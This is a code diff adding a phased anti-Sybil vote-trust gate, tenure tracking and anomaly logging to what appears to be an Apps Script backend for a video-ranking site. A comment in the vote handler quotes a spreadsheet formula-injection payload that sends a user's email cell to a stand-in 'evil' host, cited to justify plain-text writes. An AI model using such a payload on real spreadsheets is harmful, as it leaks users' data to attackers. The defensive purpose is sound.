@@ -38,7 +38,7 @@ const SPREADSHEET_IDS = {
 // every JSON response and served via ?action=version, so the live deployment
 // is always identifiable. The frontend has its own APP_VERSION in
 // js/config.js; see CHANGELOG.md at the repo root.
-const VERSION = '1.23.0';
+const VERSION = '1.24.0';
 
 const DEFAULT_REFRESH_HOURS = 4;
 const DEFAULT_PAGE_LIMIT = 20;
@@ -100,6 +100,47 @@ const RATE_LIMIT_SECONDS = 30; // Min seconds between comments per user
 // tight loop serializes every other write and churns the caches. A short
 // CacheService-backed window (keyed by email) throttles that without a Meta write.
 const VOTE_STAR_RATE_LIMIT_SECONDS = 2;
+
+// ------------------------------------------------------------
+// Vote trust / anti-Sybil (SEC-Sybil, phased rollout)
+// ------------------------------------------------------------
+// Ranking manipulation is the real residual risk: the API is world-callable
+// with any Google account, and Top This Week ranks on vote_count, so a pool of
+// fresh accounts can vault (or bury) a video. Request signing is only a speed
+// bump (its secret is public). The durable defense is here: a vote from a
+// LOW-TENURE account is still recorded (the button lights up, myVotes reflects
+// it), but it does NOT contribute to the ranking vote_count until the account
+// has been seen on the site for TRUST_TENURE_HOURS. A brand-new Sybil pool
+// therefore can't move a score at all; gaming now costs days of pre-farming
+// instead of being free and instant.
+//
+// "Tenure" = time since the account's first_seen_at in CUSTOMERS (its first
+// sign-in here), NOT Google account age — Google ID tokens don't expose account
+// age. A patient attacker can pre-register and wait; that's the accepted limit.
+//
+// Consistency: each Votes row carries a `counted` flag (see VOTE_HEADERS) set at
+// insert from the voter's tenure. Un-voting decrements vote_count only if the
+// row was counted, so a vote cast while untrusted and withdrawn after the
+// account ages in never drifts the count. The reconcile recount likewise totals
+// only counted rows. Legacy rows predating the column are treated as counted.
+const TRUST_TENURE_HOURS = 24;
+// Meta overrides (tune without a redeploy): `vote_trust_tenure_hours` sets the
+// window; `vote_trust_enabled`='true' turns ENFORCEMENT on. While enforcement is
+// off (the rollout default), tenure is still computed and anomalies still
+// logged, but every vote counts — observe-only, so the change ships dark and the
+// logs show what WOULD be gated before the gate goes live.
+const VOTE_TRUST_ENABLED_META_KEY = 'vote_trust_enabled';
+const VOTE_TRUST_TENURE_META_KEY = 'vote_trust_tenure_hours';
+// Per-video untrusted-vote velocity: this many low-tenure new votes on one video
+// inside the window logs a single "possible vote manipulation" WARN for operator
+// review. Detection is visibility only — the count gate is the actual defense,
+// so a viral video is never auto-hidden by a false positive.
+const VOTE_ANOMALY_WINDOW_SECONDS = 3600;
+const VOTE_ANOMALY_BURST_THRESHOLD = 8;
+// Cache TTL for a resolved first_seen_at (epoch ms), keyed by email hash. Once an
+// account is seen its first_seen never changes, so this is safe to cache for a
+// while; it saves a CUSTOMERS scan on every vote from an active voter.
+const FIRST_SEEN_CACHE_SECONDS = 1800;
 
 // Grace window applied to a premiere/live entry's expiry. A scheduled premiere
 // that never airs, or a stream that never ends, stops being surfaced once its
@@ -3848,7 +3889,111 @@ function migrateLegacyUserTab(name, target, headers) {
  * @returns {Sheet}
  */
 function getVotesSheet() {
-  return getUserDataTab('Votes', ['vote_id', 'video_id', 'user_email', 'created_at']);
+  // Fresh installs get the vote-trust `counted` column in the header from the
+  // start. An existing 4-column tab has it added lazily by handleVote (from the
+  // header row it already reads — no extra scan here on the hot path); readers
+  // treat a missing/blank `counted` as counted=true, so nothing breaks before
+  // the column exists.
+  return getUserDataTab('Votes', ['vote_id', 'video_id', 'user_email', 'created_at', 'counted']);
+}
+
+/** True while the operator has turned vote-trust ENFORCEMENT on in Meta. */
+function isVoteTrustEnabled() {
+  return String(getMeta(VOTE_TRUST_ENABLED_META_KEY)).toLowerCase() === 'true';
+}
+
+/** The trust window in ms — Meta `vote_trust_tenure_hours` overrides the default. */
+function trustTenureMs() {
+  var override = parseFloat(getMeta(VOTE_TRUST_TENURE_META_KEY));
+  var hours = (isFinite(override) && override >= 0) ? override : TRUST_TENURE_HOURS;
+  return hours * 60 * 60 * 1000;
+}
+
+/**
+ * The account's first_seen_at as epoch ms — the basis for its voting tenure.
+ * Cached by email hash (first_seen is immutable once set). On a cache miss it
+ * scans CUSTOMERS; a voter with no row yet (e.g. a direct API caller that never
+ * ran bootstrap) is APPENDED with first_seen=now, so skipping the sign-in flow
+ * can't dodge the gate — its clock simply starts at zero tenure.
+ *
+ * MUST be called OUTSIDE the handleVote script lock: it may take the lock itself
+ * to append a missing row, and LockService is not reentrant.
+ *
+ * Fails OPEN: if CUSTOMERS is unreachable or malformed, returns 0 (epoch) so the
+ * tenure reads as effectively infinite and the voter is treated as trusted —
+ * availability of voting beats a perfect gate, and the enable toggle is the real
+ * master switch.
+ *
+ * @param {string} email
+ * @param {string} name
+ * @returns {number} epoch ms of first sighting (0 on any failure → trusted)
+ */
+function voterFirstSeenMs(email, name) {
+  var cache = null, key = null;
+  try {
+    cache = CacheService.getScriptCache();
+    key = 'fseen_' + tokenHash(email);
+    var hit = cache.get(key);
+    if (hit) { var n = parseInt(hit, 10); if (isFinite(n)) return n; }
+  } catch (e) { cache = null; }
+
+  try {
+    var sheet = getCustomersSheet();
+    var cols = customerCols(sheet);
+    if (cols.email === -1 || cols.first_seen_at === -1) return 0; // unusable shape → trusted
+    var rows = sheet.getDataRange().getValues();
+    for (var i = 1; i < rows.length; i++) {
+      if (rows[i][cols.email] === email) {
+        var ms = Date.parse(rows[i][cols.first_seen_at]);
+        if (isNaN(ms)) return 0; // blank/unparseable → trusted (don't punish legacy rows)
+        if (cache && key) { try { cache.put(key, String(ms), FIRST_SEEN_CACHE_SECONDS); } catch (e) {} }
+        return ms;
+      }
+    }
+    // No row yet: record first sighting NOW (starts the tenure clock) under the
+    // customers lock, then treat this vote as zero-tenure.
+    var nowIso = new Date().toISOString();
+    var lock = LockService.getScriptLock();
+    try { lock.waitLock(5000); } catch (e) { return Date.now(); } // busy → zero tenure now
+    try {
+      var again = sheet.getDataRange().getValues();
+      for (var j = 1; j < again.length; j++) {
+        if (again[j][cols.email] === email) {
+          var ms2 = Date.parse(again[j][cols.first_seen_at]);
+          return isNaN(ms2) ? 0 : ms2;
+        }
+      }
+      appendCustomerRow(sheet, cols, { email: email, name: name, firstSeenAt: nowIso, source: 'vote' });
+    } finally {
+      lock.releaseLock();
+    }
+    var nowMs = Date.parse(nowIso);
+    if (cache && key) { try { cache.put(key, String(nowMs), FIRST_SEEN_CACHE_SECONDS); } catch (e) {} }
+    return nowMs;
+  } catch (e) {
+    log('ERROR', 'voteTrust', 'first_seen lookup failed (fail-open): ' + e.message);
+    return 0; // fail open — trusted
+  }
+}
+
+/**
+ * Records one untrusted new-vote against a video's rolling velocity counter and,
+ * the first time the window crosses VOTE_ANOMALY_BURST_THRESHOLD, logs a single
+ * WARN naming the video and count. Best-effort (cache-backed); never throws into
+ * the vote path. Detection/visibility only — it does not hide or rerank anything.
+ */
+function recordVoteAnomaly(videoId) {
+  try {
+    var cache = CacheService.getScriptCache();
+    var bucket = Math.floor(Date.now() / (VOTE_ANOMALY_WINDOW_SECONDS * 1000));
+    var key = 'uvel_' + videoId + '_' + bucket;
+    var n = (parseInt(cache.get(key), 10) || 0) + 1;
+    cache.put(key, String(n), VOTE_ANOMALY_WINDOW_SECONDS + 60);
+    if (n === VOTE_ANOMALY_BURST_THRESHOLD) {
+      log('WARN', 'voteTrust', 'Possible vote manipulation on ' + videoId + ': ' +
+        n + ' low-tenure votes within ' + Math.round(VOTE_ANOMALY_WINDOW_SECONDS / 60) + 'm');
+    }
+  } catch (e) { /* best-effort telemetry */ }
 }
 
 /**
@@ -3884,6 +4029,14 @@ function handleVote(data) {
     return { status: 'error', message: 'You are doing that too fast, please slow down' };
   }
 
+  // Resolve voter tenure BEFORE the lock (voterFirstSeenMs may take the lock
+  // itself to record a first sighting — LockService is not reentrant). `trusted`
+  // means the account has been seen for at least the trust window; `enforce` is
+  // the Meta master switch. While enforcement is off we still compute tenure and
+  // flag anomalies (observe-only), but every vote counts.
+  var enforce = isVoteTrustEnabled();
+  var trusted = (Date.now() - voterFirstSeenMs(user.email, user.name)) >= trustTenureMs();
+
   // Serialize the read-find-mutate-recount so concurrent toggles from the
   // same user can't double-insert or delete the wrong (shifted) row.
   var lock = LockService.getScriptLock();
@@ -3899,6 +4052,14 @@ function handleVote(data) {
     var headers = data2[0];
     var videoIdCol = headers.indexOf('video_id');
     var emailCol = headers.indexOf('user_email');
+    var countedCol = headers.indexOf('counted');
+    // Lazily add the `counted` header to a pre-gate 4-column tab, reusing the
+    // header row we just read (no extra scan). Existing rows keep a blank cell,
+    // which reads as counted=true. New rows below get the flag in this column.
+    if (countedCol === -1) {
+      countedCol = headers.length;
+      sheet.getRange(1, countedCol + 1).setValue('counted');
+    }
 
     // Find this user's existing vote on this video
     var existingRow = -1;
@@ -3910,10 +4071,20 @@ function handleVote(data) {
     }
 
     var voted;
+    var affectsCount; // whether this toggle should move the ranking vote_count
     if (existingRow !== -1) {
+      // Un-vote: decrement only if THIS row had been counted. A vote cast while
+      // untrusted (counted='false') and withdrawn after the account aged in must
+      // not decrement a count it never incremented. Legacy rows (blank counted,
+      // cast before the gate) read as counted=true.
+      var wasCounted = countedCol === -1 || String(data2[existingRow - 1][countedCol]) !== 'false';
       sheet.deleteRow(existingRow);
       voted = false;
+      affectsCount = wasCounted;
     } else {
+      // New vote. `counted` records whether it contributes to vote_count: always
+      // when enforcement is off (observe), only for trusted accounts when on.
+      var counted = enforce ? trusted : true;
       // Write as plain text so Sheets can't coerce videoId/email into a live
       // formula. The Votes tab's column C is user_email, so a videoId of
       // '=IMPORTXML("https://evil/?d="&C2,"//a")' would otherwise execute in the
@@ -3921,15 +4092,26 @@ function handleVote(data) {
       // the reserve-then-format pair used by handleStar/handleAddComment.
       var voteId = 'v_' + Utilities.getUuid().replace(/-/g, '').substring(0, 12);
       var newRowNum = sheet.getLastRow() + 1;
-      var range = sheet.getRange(newRowNum, 1, 1, 4);
+      var range = sheet.getRange(newRowNum, 1, 1, 5);
       range.setNumberFormat('@');
-      range.setValues([[voteId, videoId, user.email, new Date().toISOString()]]);
+      range.setValues([[voteId, videoId, user.email, new Date().toISOString(), counted ? 'true' : 'false']]);
       voted = true;
+      affectsCount = counted;
+
+      // Anomaly signal: a low-tenure new vote. Logged and velocity-tracked in
+      // BOTH modes so the observe window shows what enforcement would catch.
+      if (!trusted) {
+        recordVoteAnomaly(videoId);
+        log(enforce ? 'WARN' : 'INFO', 'voteTrust',
+          (enforce ? 'Gated' : 'Would gate') + ' low-tenure vote on ' + videoId);
+      }
     }
 
-    // Move the stored count by exactly the row change we just made (+1 on insert,
-    // -1 on delete) instead of re-scanning the whole Votes sheet to recount (BE5).
-    var count = updateVoteCount(videoId, voted ? 1 : -1);
+    // Move the stored count by the known row change (+1/-1) when this toggle
+    // affects it; otherwise reconcile (delta omitted) so the returned count is
+    // the authoritative trusted total — the just-written 'false' row / the
+    // just-deleted uncounted row is excluded, so the number is correct either way.
+    var count = affectsCount ? updateVoteCount(videoId, voted ? 1 : -1) : updateVoteCount(videoId);
     return { status: 'ok', voted: voted, vote_count: count };
   } finally {
     lock.releaseLock();
@@ -3988,14 +4170,20 @@ function updateVoteCount(videoId, delta) {
 
   var count;
   if (!incremental) {
-    // Reconcile path: authoritative recount from the Votes sheet.
+    // Reconcile path: authoritative recount from the Votes sheet. Counts only
+    // rows that CONTRIBUTE to the ranking — `counted` !== 'false'. A row cast by
+    // a low-tenure account under enforcement carries counted='false' and is
+    // excluded; legacy rows (blank counted, pre-gate) count as before.
     var votesSheet = getVotesSheet();
     var votesData = votesSheet.getDataRange().getValues();
     var vHeaders = votesData[0];
     var voteVideoCol = vHeaders.indexOf('video_id');
+    var voteCountedCol = vHeaders.indexOf('counted');
     count = 0;
     for (var i = 1; i < votesData.length; i++) {
-      if (votesData[i][voteVideoCol] === videoId) count++;
+      if (votesData[i][voteVideoCol] !== videoId) continue;
+      if (voteCountedCol !== -1 && String(votesData[i][voteCountedCol]) === 'false') continue;
+      count++;
     }
   }
 
